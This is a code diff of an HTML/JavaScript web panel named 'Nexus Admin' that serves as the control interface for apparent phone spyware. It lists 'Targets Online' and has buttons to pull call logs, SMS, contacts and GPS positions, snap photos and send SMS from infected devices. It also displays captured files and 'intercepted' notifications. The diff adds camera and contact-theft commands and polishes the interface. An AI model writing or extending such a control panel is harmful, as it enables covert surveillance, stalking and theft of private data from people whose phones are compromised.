@@ -2,115 +2,389 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Nexus Admin Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg: #0f172a;
-            --surface: #1e293b;
-            --primary: #3b82f6;
+            --bg-color: #0f111a;
+            --surface-color: rgba(30, 33, 48, 0.6);
+            --primary-color: #00f2fe;
+            --primary-glow: rgba(0, 242, 254, 0.4);
+            --secondary-color: #4facfe;
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
-            --border: #334155;
+            --border: rgba(255, 255, 255, 0.1);
             --success: #10b981;
             --danger: #ef4444;
         }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }
-        body { background: var(--bg); color: var(--text-main); }
-        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
-        header { border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;}
-        h1 { font-size: 1.5rem; }
-        .refresh-btn { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: bold;}
-        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
-        .card h2 { font-size: 1.2rem; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px;}
+
+        * {
+            box-sizing: border-box; margin: 0; padding: 0;
+            font-family: 'Outfit', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f111a 0%, #1a1b26 100%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* Ambient Background Glow */
+        .ambient-light {
+            position: fixed;
+            top: -20%; left: -10%;
+            width: 50vw; height: 50vw;
+            border-radius: 50%;
+            background: radial-gradient(circle, var(--primary-glow) 0%, transparent 70%);
+            filter: blur(80px);
+            z-index: -1;
+            pointer-events: none;
+        }
         
-        .device-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: rgba(255,255,255,0.05); border-radius: 8px; margin-bottom: 10px;}
-        .device-info { display: flex; flex-direction: column; }
-        .device-name { font-weight: bold; font-size: 1.1rem;}
-        .device-id { font-size: 0.8rem; color: var(--text-muted); }
+        .ambient-light-2 {
+            position: fixed;
+            bottom: -20%; right: -10%;
+            width: 40vw; height: 40vw;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(79, 172, 254, 0.2) 0%, transparent 70%);
+            filter: blur(80px);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        header {
+            padding: 20px;
+            display: flex; justify-content: space-between; align-items: center;
+            backdrop-filter: blur(12px);
+            background: rgba(15, 17, 26, 0.8);
+            border-bottom: 1px solid var(--border);
+            position: sticky; top: 0; z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.4rem; font-weight: 700;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .btn-refresh {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--primary-color);
+            border: 1px solid var(--border);
+            padding: 8px 16px; border-radius: 20px;
+            cursor: pointer; font-weight: 600;
+            transition: all 0.3s ease;
+            display: flex; align-items: center; gap: 6px;
+        }
+
+        .btn-refresh:hover, .btn-refresh:active {
+            background: var(--primary-color); color: #000;
+            box-shadow: 0 0 15px var(--primary-glow);
+        }
+
+        .container {
+            padding: 20px; flex: 1;
+            max-width: 800px; margin: 0 auto; width: 100%;
+        }
+
+        /* Glass Cards */
+        .card {
+            background: var(--surface-color);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 24px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
+        }
+
+        .card-header {
+            font-size: 1.2rem; font-weight: 600;
+            margin-bottom: 20px; display: flex; align-items: center; gap: 10px;
+            color: var(--text-main);
+        }
+
+        /* Devices */
+        .device-item {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px; padding: 15px; margin-bottom: 15px;
+        }
+
+        .device-info {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px;
+        }
         
-        button { background: var(--surface); color: var(--text-main); border: 1px solid var(--border); padding: 8px 12px; border-radius: 6px; cursor: pointer; margin: 4px; transition: 0.2s; }
-        button:hover { background: var(--primary); border-color: var(--primary); }
+        .device-name { font-weight: 600; font-size: 1.1rem; color: #fff;}
+        .device-id { font-size: 0.8rem; color: var(--text-muted); background: rgba(255,255,255,0.1); padding: 3px 8px; border-radius: 10px;}
+        .status-dot { height: 8px; width: 8px; background: var(--success); border-radius: 50%; display: inline-block; box-shadow: 0 0 8px var(--success); margin-right: 6px;}
+
+        .action-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
+        }
+
+        .btn-action {
+            background: rgba(255, 255, 255, 0.03);
+            color: var(--text-muted);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 10px 5px; border-radius: 8px;
+            cursor: pointer; font-size: 0.85rem; font-weight: 500;
+            transition: all 0.2s;
+            display: flex; flex-direction: column; align-items: center; gap: 6px;
+        }
+        .btn-action i { font-size: 1.2rem; color: var(--primary-color); }
+
+        .btn-action:hover, .btn-action:active {
+            background: rgba(0, 242, 254, 0.1);
+            color: #fff; border-color: rgba(0, 242, 254, 0.3);
+            transform: translateY(-2px);
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex; border-bottom: 1px solid var(--border); margin-bottom: 20px;
+            overflow-x: auto; scrollbar-width: none;
+        }
+        .tabs::-webkit-scrollbar { display: none; }
         
-        .list-item { padding: 10px; border-bottom: 1px solid var(--border); }
-        .list-item:last-child { border-bottom: none; }
-        .timestamp { font-size: 0.8rem; color: var(--text-muted); margin-bottom: 4px;}
-        .data-content { font-size: 0.95rem; }
-        
-        .tabs { display: flex; margin-bottom: 15px; border-bottom: 1px solid var(--border);}
-        .tab { padding: 10px 20px; cursor: pointer; color: var(--text-muted); border-bottom: 2px solid transparent;}
-        .tab.active { color: var(--primary); border-bottom-color: var(--primary); font-weight: bold;}
-        
+        .tab {
+            padding: 12px 20px; cursor: pointer; color: var(--text-muted);
+            font-weight: 600; white-space: nowrap; transition: 0.3s;
+            position: relative;
+        }
+        .tab.active { color: var(--primary-color); }
+        .tab.active::after {
+            content: ''; position: absolute; bottom: -1px; left: 0; width: 100%;
+            height: 2px; background: var(--primary-color);
+            box-shadow: 0 -2px 10px var(--primary-glow);
+        }
+
+        /* Lists */
+        .list-item {
+            padding: 12px; background: rgba(0,0,0,0.2); border-radius: 8px; margin-bottom: 10px;
+            border-left: 3px solid var(--border); transition: 0.2s;
+        }
+        .list-item:hover { border-left-color: var(--primary-color); background: rgba(255,255,255,0.03); }
+        .item-meta { font-size: 0.75rem; color: var(--text-muted); margin-bottom: 6px; display: flex; justify-content: space-between;}
+        .item-content { font-size: 0.95rem; line-height: 1.4; word-break: break-all; }
+        .item-content a { color: var(--primary-color); text-decoration: none; font-weight: 500; }
+        .item-content a:hover { text-decoration: underline; }
+
         .hidden { display: none; }
-        a { color: var(--primary); text-decoration: none; }
-        a:hover { text-decoration: underline; }
+
+        /* Custom Prompt Overlay */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px);
+            z-index: 1000; display: flex; justify-content: center; align-items: center;
+            opacity: 0; pointer-events: none; transition: 0.3s;
+        }
+        .overlay.active { opacity: 1; pointer-events: auto; }
+        .dialog {
+            background: #1e2130; border: 1px solid var(--border); border-radius: 16px;
+            padding: 20px; width: 90%; max-width: 320px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            transform: translateY(20px); transition: 0.3s;
+        }
+        .overlay.active .dialog { transform: translateY(0); }
+        .dialog h3 { margin-bottom: 15px; color: #fff;}
+        .dialog input {
+            width: 100%; padding: 12px; margin-bottom: 15px;
+            background: rgba(0,0,0,0.3); border: 1px solid var(--border);
+            color: #fff; border-radius: 8px; outline: none;
+        }
+        .dialog input:focus { border-color: var(--primary-color); }
+        .dialog-actions { display: flex; justify-content: flex-end; gap: 10px; }
+        .btn-dialog { padding: 10px 15px; border-radius: 8px; border: none; font-weight: 600; cursor: pointer; }
+        .btn-cancel { background: rgba(255,255,255,0.1); color: #fff; }
+        .btn-submit { background: var(--primary-color); color: #000; }
+
+        /* Toast Notifications */
+        .toast-container {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            display: flex; flex-direction: column; gap: 10px; z-index: 2000;
+        }
+        .toast {
+            background: rgba(30, 33, 48, 0.95); backdrop-filter: blur(10px);
+            border: 1px solid var(--border); border-radius: 10px;
+            padding: 12px 20px; color: #fff; font-size: 0.9rem; font-weight: 500;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.4);
+            animation: slideUp 0.3s ease forwards;
+        }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Loader */
+        .loader {
+            display: inline-block; width: 20px; height: 20px;
+            border: 2px solid rgba(255,255,255,0.2); border-radius: 50%;
+            border-top-color: var(--primary-color); animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .empty-state { text-align: center; padding: 30px 10px; color: var(--text-muted); }
+        .empty-state i { font-size: 2.5rem; margin-bottom: 10px; opacity: 0.5; }
+
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>📡 Admin Dashboard</h1>
-            <button class="refresh-btn" onclick="fetchData()">🔄 Refresh</button>
-        </header>
+    <div class="ambient-light"></div>
+    <div class="ambient-light-2"></div>
 
+    <header>
+        <div class="logo"><i class="fa-solid fa-satellite-dish"></i> Nexus Admin</div>
+        <button class="btn-refresh" onclick="fetchData(this)"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </header>
+
+    <div class="container">
+        <!-- Devices Card -->
         <div class="card">
-            <h2>📱 Online Devices</h2>
-            <div id="deviceList">Loading...</div>
+            <div class="card-header"><i class="fa-solid fa-mobile-screen-button" style="color: var(--primary-color);"></i> Targets Online</div>
+            <div id="deviceList"><div class="empty-state"><div class="loader"></div><p>Scanning network...</p></div></div>
         </div>
 
-        <div class="card">
+        <!-- Data Card -->
+        <div class="card" style="padding: 0; overflow: hidden;">
             <div class="tabs">
-                <div class="tab active" onclick="switchTab('files')">Files (Logs)</div>
-                <div class="tab" onclick="switchTab('notifications')">Notifications</div>
-                <div class="tab" onclick="switchTab('locations')">Locations</div>
+                <div class="tab active" onclick="switchTab('files', this)"><i class="fa-solid fa-file-lines"></i> Logs</div>
+                <div class="tab" onclick="switchTab('notifications', this)"><i class="fa-solid fa-bell"></i> Alerts</div>
+                <div class="tab" onclick="switchTab('locations', this)"><i class="fa-solid fa-location-dot"></i> GPS</div>
             </div>
             
-            <div id="filesList" class="tab-content">Loading files...</div>
-            <div id="notificationsList" class="tab-content hidden">Loading notifications...</div>
-            <div id="locationsList" class="tab-content hidden">Loading locations...</div>
+            <div style="padding: 0 20px 20px 20px;">
+                <div id="filesList" class="tab-content"><div class="empty-state"><div class="loader"></div></div></div>
+                <div id="notificationsList" class="tab-content hidden"><div class="empty-state"><div class="loader"></div></div></div>
+                <div id="locationsList" class="tab-content hidden"><div class="empty-state"><div class="loader"></div></div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <!-- Custom Prompt for SMS -->
+    <div class="overlay" id="smsDialog">
+        <div class="dialog">
+            <h3><i class="fa-solid fa-comment-sms"></i> Send Command</h3>
+            <input type="text" id="smsTo" placeholder="Target Phone Number (e.g. +9198...)">
+            <input type="text" id="smsBody" placeholder="Message content...">
+            <input type="hidden" id="smsDeviceId">
+            <div class="dialog-actions">
+                <button class="btn-dialog btn-cancel" onclick="closeDialog()">Cancel</button>
+                <button class="btn-dialog btn-submit" onclick="submitSms()">Send</button>
+            </div>
         </div>
     </div>
 
     <script>
+        function showToast(message) {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `<i class="fa-solid fa-circle-info" style="color: var(--primary-color); margin-right: 8px;"></i> ${message}`;
+            container.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
+        }
+
+        // Handle sending regular commands
         function sendCommand(deviceId, command) {
-            let body = { deviceId, command };
-            if (command === 'ms') {
-                const to = prompt("Enter target phone number:");
-                if (!to) return;
-                const msg = prompt("Enter SMS message:");
-                if (!msg) return;
-                body.smsTo = to;
-                body.smsBody = msg;
-            }
             fetch('/admin/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(body)
+                body: JSON.stringify({ deviceId, command })
             }).then(res => res.json()).then(data => {
-                alert(data.message || data.error);
-            }).catch(e => alert("Error: " + e));
+                showToast(data.message || data.error);
+            }).catch(e => showToast("Network Error"));
         }
 
-        async function fetchData() {
+        // Handle SMS prompt
+        function promptSms(deviceId) {
+            document.getElementById('smsDeviceId').value = deviceId;
+            document.getElementById('smsTo').value = '';
+            document.getElementById('smsBody').value = '';
+            document.getElementById('smsDialog').classList.add('active');
+            document.getElementById('smsTo').focus();
+        }
+
+        function closeDialog() {
+            document.getElementById('smsDialog').classList.remove('active');
+        }
+
+        function submitSms() {
+            const deviceId = document.getElementById('smsDeviceId').value;
+            const smsTo = document.getElementById('smsTo').value;
+            const smsBody = document.getElementById('smsBody').value;
+            
+            if(!smsTo || !smsBody) {
+                showToast("Please fill all fields");
+                return;
+            }
+
+            fetch('/admin/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId, command: 'ms', smsTo, smsBody })
+            }).then(res => res.json()).then(data => {
+                showToast(data.message || data.error);
+                closeDialog();
+            }).catch(e => showToast("Network Error"));
+        }
+
+        function formatTime(ms) {
+            return new Date(ms).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+        }
+
+        async function fetchData(btn = null) {
+            if(btn) {
+                const icon = btn.querySelector('i');
+                icon.classList.add('fa-spin');
+                setTimeout(() => icon.classList.remove('fa-spin'), 1000);
+            }
+
             try {
                 // Fetch Devices
                 const devRes = await fetch('/admin/devices');
                 const devices = await devRes.json();
                 const devContainer = document.getElementById('deviceList');
                 if (devices.length === 0) {
-                    devContainer.innerHTML = "<p style='color:var(--text-muted)'>No devices online</p>";
+                    devContainer.innerHTML = `<div class="empty-state"><i class="fa-solid fa-mobile-screen"></i><p>No devices currently online</p></div>`;
                 } else {
                     devContainer.innerHTML = devices.map(d => `
                         <div class="device-item">
                             <div class="device-info">
-                                <span class="device-name">${d.name}</span>
-                                <span class="device-id">${d.id}</span>
+                                <div>
+                                    <span class="status-dot"></span>
+                                    <span class="device-name">${d.name}</span>
+                                </div>
+                                <span class="device-id">${d.id.substring(0,8)}...</span>
                             </div>
-                            <div class="device-actions">
-                                <button onclick="sendCommand('${d.id}', 'ch')">📞 Calls</button>
-                                <button onclick="sendCommand('${d.id}', 'as')">💬 SMS</button>
-                                <button onclick="sendCommand('${d.id}', 'loc')">📍 Location</button>
-                                <button onclick="sendCommand('${d.id}', 'ms')">📤 Send SMS</button>
+                            <div class="action-grid">
+                                <div class="btn-action" onclick="sendCommand('${d.id}', 'ch')">
+                                    <i class="fa-solid fa-phone-flip"></i> Call Logs
+                                </div>
+                                <div class="btn-action" onclick="sendCommand('${d.id}', 'as')">
+                                    <i class="fa-solid fa-comments"></i> In/Out SMS
+                                </div>
+                                <div class="btn-action" onclick="sendCommand('${d.id}', 'loc')">
+                                    <i class="fa-solid fa-location-crosshairs"></i> Get GPS
+                                </div>
+                                <div class="btn-action" onclick="sendCommand('${d.id}', 'cf')">
+                                    <i class="fa-solid fa-camera"></i> Snap Photo
+                                </div>
+                                <div class="btn-action" onclick="promptSms('${d.id}')">
+                                    <i class="fa-solid fa-paper-plane"></i> Send SMS
+                                </div>
+                                <div class="btn-action" onclick="sendCommand('${d.id}', 'contact')">
+                                    <i class="fa-solid fa-address-book"></i> Contacts
+                                </div>
                             </div>
                         </div>
                     `).join('');
@@ -121,46 +395,50 @@
                 const files = await filesRes.json();
                 document.getElementById('filesList').innerHTML = files.length ? files.map(f => `
                     <div class="list-item">
-                        <div class="timestamp">${new Date(f.timestamp).toLocaleString()} - ${f.deviceName}</div>
-                        <div class="data-content">📄 <a href="${f.url}" target="_blank">${f.originalname}</a></div>
+                        <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(f.timestamp)}</span> <span>${f.deviceName}</span></div>
+                        <div class="item-content"><i class="fa-solid fa-download"></i> <a href="${f.url}" target="_blank">${f.originalname}</a></div>
                     </div>
-                `).join('') : "<p style='color:var(--text-muted)'>No files uploaded yet</p>";
+                `).join('') : `<div class="empty-state"><i class="fa-solid fa-folder-open"></i><p>No captured files yet</p></div>`;
 
                 // Fetch Notifications
                 const notifRes = await fetch('/admin/notifications');
                 const notifications = await notifRes.json();
                 document.getElementById('notificationsList').innerHTML = notifications.length ? notifications.map(n => `
                     <div class="list-item">
-                        <div class="timestamp">${new Date(n.timestamp).toLocaleString()} - ${n.deviceName}</div>
-                        <div class="data-content">${n.text.replace(/\\n/g, '<br>')}</div>
+                        <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(n.timestamp)}</span> <span>${n.deviceName}</span></div>
+                        <div class="item-content">${n.text.replace(/\\n/g, '<br>')}</div>
                     </div>
-                `).join('') : "<p style='color:var(--text-muted)'>No notifications</p>";
+                `).join('') : `<div class="empty-state"><i class="fa-solid fa-bell-slash"></i><p>No notifications intercepted</p></div>`;
 
                 // Fetch Locations
                 const locRes = await fetch('/admin/locations');
                 const locations = await locRes.json();
                 document.getElementById('locationsList').innerHTML = locations.length ? locations.map(l => `
                     <div class="list-item">
-                        <div class="timestamp">${new Date(l.timestamp).toLocaleString()} - ${l.deviceName}</div>
-                        <div class="data-content">📍 <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">${l.latitude}, ${l.longitude}</a></div>
+                        <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(l.timestamp)}</span> <span>${l.deviceName}</span></div>
+                        <div class="item-content">
+                            <i class="fa-solid fa-map-location-dot" style="color:var(--primary-color)"></i> 
+                            <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">View on Google Maps</a>
+                        </div>
                     </div>
-                `).join('') : "<p style='color:var(--text-muted)'>No locations</p>";
+                `).join('') : `<div class="empty-state"><i class="fa-solid fa-location-arrow"></i><p>No GPS data captured</p></div>`;
 
             } catch (e) {
-                console.error("Failed to fetch data", e);
+                console.error("Fetch Error:", e);
             }
         }
 
-        function switchTab(tabId) {
+        function switchTab(tabId, el) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
             
-            event.target.classList.add('active');
+            el.classList.add('active');
             document.getElementById(tabId + 'List').classList.remove('hidden');
         }
 
+        // Initialize
         fetchData();
-        setInterval(fetchData, 10000); // Auto-refresh every 10s
+        setInterval(() => fetchData(), 10000); // 10s auto refresh
     </script>
 </body>
 </html>
